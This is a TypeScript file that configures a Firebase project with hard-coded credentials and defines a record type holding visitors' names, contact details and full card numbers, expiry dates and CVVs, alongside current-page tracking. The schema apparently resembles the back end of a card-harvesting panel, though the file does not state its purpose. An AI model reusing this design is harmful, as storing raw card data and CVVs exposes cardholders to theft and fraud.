import { initializeApp, getApps, getApp } from "firebase/app";
import { getAuth } from "firebase/auth";
import { getFirestore } from "firebase/firestore";
import { getDatabase } from "firebase/database";

const firebaseConfig = {
   apiKey: "AIzaSyDgFnMZD4NHBPe6cAT1CtL1amIBqmaKzEU",
  authDomain: "ziolm-16b34.firebaseapp.com",
  databaseURL: "https://ziolm-16b34-default-rtdb.firebaseio.com",
  projectId: "ziolm-16b34",
  storageBucket: "ziolm-16b34.firebasestorage.app",
  messagingSenderId: "669950264738",
  appId: "1:669950264738:web:b18d8aae90b7e048c3defb",
  measurementId: "G-XVP5TC5KKQ"
};

const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);
const database = getDatabase(app);

export { app, auth, db, database };

export interface NotificationDocument {
  id: string;
  name: string;
  hasPersonalInfo: boolean;
  hasCardInfo: boolean;
  currentPage: string;
  time: string;
  notificationCount: number;
  personalInfo?: {
    fullName: string;
    email: string;
    phone: string;
    address: string;
  };
  cardInfo?: {
    cardNumber: string;
    expirationDate: string;
    cvv: string;
  };
}

